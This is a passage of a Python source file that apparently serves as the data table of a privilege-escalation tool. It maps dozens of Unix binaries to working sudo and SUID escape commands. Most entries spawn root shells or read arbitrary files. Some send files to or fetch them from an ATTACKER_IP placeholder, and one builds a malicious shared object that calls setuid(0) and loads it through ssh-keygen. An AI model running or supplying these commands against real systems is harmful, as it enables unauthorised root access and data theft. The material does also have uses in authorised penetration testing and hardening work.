}

COMMANDS["debugfs"] = {
    "suid": {
        "shell": (1, "debugfs\n!/bin/sh -p"),
        "file_read": (3, "debugfs /dev/sda1 -R 'cat /path/to/file'"),
    },
    "sudo": {
        "shell": (1, "sudo debugfs\n!/bin/sh"),
        "file_read": (3, "sudo debugfs /dev/sda1 -R 'cat /path/to/file'"),
    },
    "capabilities": {},
}

# ============================================================================
# BATCH 4: REMAINING MISSING (mostly Limited SUID + a few regular)
# ============================================================================

COMMANDS["aria2c"] = {
    "suid": {
        "file_download": (4, "aria2c -o /path/to/output http://ATTACKER_IP/file"),
    },
    "sudo": {
        "file_download": (4, "sudo aria2c -o /path/to/output http://ATTACKER_IP/file"),
    },
    "capabilities": {},
}

COMMANDS["batcat"] = {
    "suid": {
        "file_read": (3, "batcat --paging always /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo batcat --paging always /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["byebug"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "TF=$(mktemp); echo 'system(\"/bin/sh\")' > $TF; sudo byebug $TF\ncontinue"),
    },
    "capabilities": {},
}

COMMANDS["composer"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "TF=$(mktemp -d); echo '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' > $TF/composer.json; cd $TF; sudo composer run-script x"),
    },
    "capabilities": {},
}

COMMANDS["dc"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo dc -e '!/bin/sh'"),
    },
    "capabilities": {},
}

COMMANDS["dvips"] = {
    "suid": {},
    "sudo": {
        "file_read": (3, "sudo dvips -o /dev/stdout /path/to/file.dvi"),
    },
    "capabilities": {},
}

COMMANDS["gimp"] = {
    "suid": {
        "shell": (1, "gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'"),
    },
    "sudo": {
        "shell": (1, "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\",\"sh\")'"),
    },
    "capabilities": {},
}

COMMANDS["ginsh"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo ginsh\n!/bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["joe"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo joe\n^K!/bin/sh"),
        "file_read": (3, "sudo joe /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["latex"] = {
    "suid": {},
    "sudo": {
        "file_read": (3, "sudo latex '\\input{/path/to/file}'"),
    },
    "capabilities": {},
}

COMMANDS["ldconfig"] = {
    "suid": {},
    "sudo": {
        "file_read": (3, "sudo ldconfig -f /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["lftp"] = {
    "suid": {},
    "sudo": {
        "file_read": (3, "sudo lftp -c 'cat /path/to/file'"),
    },
    "capabilities": {},
}

COMMANDS["lualatex"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo lualatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}'"),
    },
    "capabilities": {},
}

COMMANDS["luatex"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}'"),
    },
    "capabilities": {},
}

COMMANDS["ncdu"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo ncdu\nb  # then press 'b' to spawn shell"),
    },
    "capabilities": {},
}

COMMANDS["octave"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo octave --eval 'system(\"/bin/sh\")'"),
        "file_read": (3, "sudo octave --eval 'printf(\"%s\\n\", fileread(\"/path/to/file\"))'"),
    },
    "capabilities": {},
}

COMMANDS["pdflatex"] = {
    "suid": {},
    "sudo": {
        "file_read": (3, "sudo pdflatex '\\input{/path/to/file}'"),
    },
    "capabilities": {},
}

COMMANDS["pdftex"] = {
    "suid": {},
    "sudo": {
        "file_read": (3, "sudo pdftex '\\input{/path/to/file}'"),
    },
    "capabilities": {},
}

COMMANDS["pic"] = {
    "suid": {},
    "sudo": {
        "file_read": (3, "sudo pic /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["pry"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo pry\nsystem(\"/bin/sh\")"),
    },
    "capabilities": {},
}

COMMANDS["psftp"] = {
    "suid": {},
    "sudo": {
        "file_upload": (3, "sudo psftp user@ATTACKER_IP\nput /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["rake"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo rake -p '`/bin/sh 1>&0`'"),
    },
    "capabilities": {},
}

COMMANDS["rpm"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"),
    },
    "capabilities": {},
}

COMMANDS["rpmdb"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo rpmdb --eval '%{lua:os.execute(\"/bin/sh\")}'"),
    },
    "capabilities": {},
}

COMMANDS["rpmquery"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo rpmquery --eval '%{lua:os.execute(\"/bin/sh\")}'"),
    },
    "capabilities": {},
}

COMMANDS["rpmverify"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo rpmverify --eval '%{lua:os.execute(\"/bin/sh\")}'"),
    },
    "capabilities": {},
}

COMMANDS["runscript"] = {
    "suid": {
        "shell": (1, "runscript /dev/null\n!/bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo runscript /dev/null\n!/bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["scrot"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo scrot -e /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["slsh"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo slsh -e 'system(\"/bin/sh\")'"),
    },
    "capabilities": {},
}

COMMANDS["ssh-agent"] = {
    "suid": {
        "shell": (1, "ssh-agent /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo ssh-agent /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["ssh-keygen"] = {
    "suid": {
        "shell": (1, "# Create .so: echo '__attribute__((constructor)) void x(){setuid(0);system(\"/bin/sh\");}' > /tmp/pe.c && gcc -shared -fPIC -o /tmp/pe.so /tmp/pe.c\nssh-keygen -D /tmp/pe.so"),
    },
    "sudo": {
        "shell": (1, "# Create .so: echo '__attribute__((constructor)) void x(){system(\"/bin/sh\");}' > /tmp/pe.c && gcc -shared -fPIC -o /tmp/pe.so /tmp/pe.c\nsudo ssh-keygen -D /tmp/pe.so"),
    },
    "capabilities": {},
}

COMMANDS["ssh-keyscan"] = {
    "suid": {
        "file_read": (3, "ssh-keyscan -f /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo ssh-keyscan -f /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["tasksh"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo tasksh\n!/bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["tdbtool"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo tdbtool /dev/null\n!/bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["telnet"] = {
    "suid": {},
    "sudo": {
        "file_read": (3, "sudo telnet localhost 23 < /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["tex"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo tex '\\input |/bin/sh'"),
    },
    "capabilities": {},
}

COMMANDS["tmate"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo tmate -c /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["xelatex"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo xelatex -shell-escape '\\write18{/bin/sh}'"),
    },
    "capabilities": {},
}

COMMANDS["xetex"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo xetex -shell-escape '\\write18{/bin/sh}'"),
    },
    "capabilities": {},
}

# ============================================================================
# ALIASES MAP - binary names that map to the same commands
# ============================================================================

ALIASES = {
    "python2": "python",
    "python3": "python",
    "python2.7": "python",
    "python3.6": "python",
    "python3.7": "python",
    "python3.8": "python",
    "python3.9": "python",
    "python3.10": "python",
    "python3.11": "python",
    "python3.12": "python",
    "perl5": "perl",
    "ruby2": "ruby",
    "ruby3": "ruby",
    "lua5": "lua",
    "lua5.1": "lua",
    "lua5.3": "lua",
    "lua5.4": "lua",
    "php7": "php",
    "php8": "php",
    "nodejs": "node",
    "vim.basic": "vim",
    "vim.tiny": "vim",
    "vimdiff": "vim",
    "rvim": "vim",
    "rview": "vi",
    "view": "vi",
    "posh": "sh",
    "zsh5": "zsh",
    "busybox.nosuid": "busybox",
    "busybox.suid": "busybox",
    "ncat": "nc",
    "netcat": "nc",
    "gawk": "awk",
    "mawk": "awk",
    "nawk": "awk",
    "pager": "less",
    "journalctl": "journalctl",
}

# fmt: on
